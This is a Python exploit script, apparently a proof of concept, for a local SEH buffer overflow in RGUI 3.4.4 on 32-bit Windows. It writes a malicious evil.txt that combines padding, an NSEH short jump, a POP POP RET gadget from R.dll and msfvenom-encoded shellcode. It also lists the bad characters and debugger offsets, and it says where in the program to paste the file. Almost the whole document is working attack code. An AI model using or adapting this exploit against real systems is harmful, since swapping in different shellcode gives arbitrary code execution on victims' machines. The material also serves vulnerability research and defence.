#!/usr/bin/python
from struct import pack

#------------------------------------------------------------#
# To exploit it, run the .py exploit and paste the evil.txt  #
# contents in the Languages for menus and messages under     #
# the RGUI configuration editor menu.                        #
#------------------------------------------------------------#
# Exploit - RGUI i386 3.4.4 local SEH overflow               #
#                                                            #
# POP POP RET - 0x6cb9788f                                   #
# SEH - 0x6cb9788f - POPPOPRET - R.dll                       #
# NSEH - "\xEB\x08\x90\x90" - JMP short forward 8            #
# BAD CHARS - "\x00\x0a\x0d\x0e"                             #
# PAYLOAD - pop calc.exe                                     #
#------------------------------------------------------------#
#   Author : x00pwn                                          #
#   Date: 9/26/2019                                          #
#   Victim system: Windows 7 pro                             #
#   Protections - DEP/no ASLR/no SAFESEH/no                  #
#------------------------------------------------------------#


#msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0a\x0d\x0e" -e x86/alpha_mixed -f python -v shellcode EXITFUNC=seh
shellcode =  ""
shellcode += "\x89\xe0\xd9\xc5\xd9\x70\xf4\x5b\x53\x59\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
shellcode += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
shellcode += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
shellcode += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode += "\x69\x6c\x69\x78\x6b\x32\x35\x50\x67\x70\x45\x50"
shellcode += "\x45\x30\x4b\x39\x58\x65\x50\x31\x69\x50\x30\x64"
shellcode += "\x6c\x4b\x46\x30\x74\x70\x4e\x6b\x53\x62\x54\x4c"
shellcode += "\x6e\x6b\x33\x62\x35\x44\x4c\x4b\x71\x62\x44\x68"
shellcode += "\x56\x6f\x68\x37\x72\x6a\x57\x56\x34\x71\x39\x6f"
shellcode += "\x4c\x6c\x65\x6c\x73\x51\x63\x4c\x76\x62\x44\x6c"
shellcode += "\x75\x70\x4a\x61\x5a\x6f\x36\x6d\x33\x31\x78\x47"
shellcode += "\x59\x72\x59\x62\x66\x32\x53\x67\x4c\x4b\x51\x42"
shellcode += "\x46\x70\x6e\x6b\x63\x7a\x55\x6c\x6e\x6b\x62\x6c"
shellcode += "\x47\x61\x62\x58\x38\x63\x47\x38\x73\x31\x5a\x71"
shellcode += "\x70\x51\x6c\x4b\x53\x69\x71\x30\x35\x51\x48\x53"
shellcode += "\x6e\x6b\x52\x69\x74\x58\x49\x73\x64\x7a\x57\x39"
shellcode += "\x4e\x6b\x67\x44\x4e\x6b\x46\x61\x6a\x76\x50\x31"
shellcode += "\x4b\x4f\x6e\x4c\x69\x51\x48\x4f\x76\x6d\x56\x61"
shellcode += "\x6b\x77\x75\x68\x4b\x50\x74\x35\x38\x76\x53\x33"
shellcode += "\x63\x4d\x4b\x48\x75\x6b\x33\x4d\x46\x44\x33\x45"
shellcode += "\x4d\x34\x56\x38\x6e\x6b\x70\x58\x31\x34\x45\x51"
shellcode += "\x78\x53\x30\x66\x4e\x6b\x64\x4c\x42\x6b\x6c\x4b"
shellcode += "\x36\x38\x57\x6c\x67\x71\x79\x43\x6c\x4b\x64\x44"
shellcode += "\x4e\x6b\x36\x61\x4a\x70\x6f\x79\x30\x44\x55\x74"
shellcode += "\x64\x64\x31\x4b\x33\x6b\x30\x61\x30\x59\x43\x6a"
shellcode += "\x33\x61\x39\x6f\x69\x70\x33\x6f\x71\x4f\x73\x6a"
shellcode += "\x6e\x6b\x66\x72\x4a\x4b\x4c\x4d\x63\x6d\x50\x6a"
shellcode += "\x65\x51\x4e\x6d\x4c\x45\x6d\x62\x57\x70\x77\x70"
shellcode += "\x67\x70\x32\x70\x55\x38\x46\x51\x4e\x6b\x32\x4f"
shellcode += "\x6f\x77\x69\x6f\x79\x45\x6d\x6b\x4b\x4e\x64\x4e"
shellcode += "\x74\x72\x4b\x5a\x70\x68\x6c\x66\x6d\x45\x4f\x4d"
shellcode += "\x4f\x6d\x79\x6f\x6b\x65\x45\x6c\x65\x56\x43\x4c"
shellcode += "\x67\x7a\x6b\x30\x39\x6b\x59\x70\x61\x65\x63\x35"
shellcode += "\x6f\x4b\x50\x47\x42\x33\x50\x72\x42\x4f\x30\x6a"
shellcode += "\x35\x50\x36\x33\x69\x6f\x39\x45\x73\x53\x50\x61"
shellcode += "\x72\x4c\x32\x43\x44\x6e\x53\x55\x43\x48\x53\x55"
shellcode += "\x67\x70\x41\x41"


# Log data, item 112
# Address=0BADF00D
# Message=    SEH record (nseh field) at 0x0141e894 overwritten with normal pattern : 0x42306542 (offset 900), followed by 5988 bytes of cyclic data after the handler


# POP POP RET
# Log data, item 20
# Address=6CB9788F
# Message=  0x6cb9788f : pop esi # pop edi # ret 0x10 |  {PAGE_EXECUTE_READ} [R.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.4.4 (C:\Program Files\R\R-3.4.4\bin\i386\R.dll)

nseh = "\xEB\x08\x90\x90"
seh = pack('I', 0x6cb9788f)

payload = "A" * 900
payload += nseh
payload += seh
payload += "\x90" * 16
payload += shellcode
payload += "D" * (5000 - len(payload))

try:
    exploitCreate = open("evil.txt", "w")
    print("[x] Malicious file created")
    exploitCreate.write(payload)
    print("[x] Payload added to the file")
    exploitCreate.close()
    print("[x] Import evil.txt and pop a calc")
except:
    print("[!] Error creating malicious .txt file")
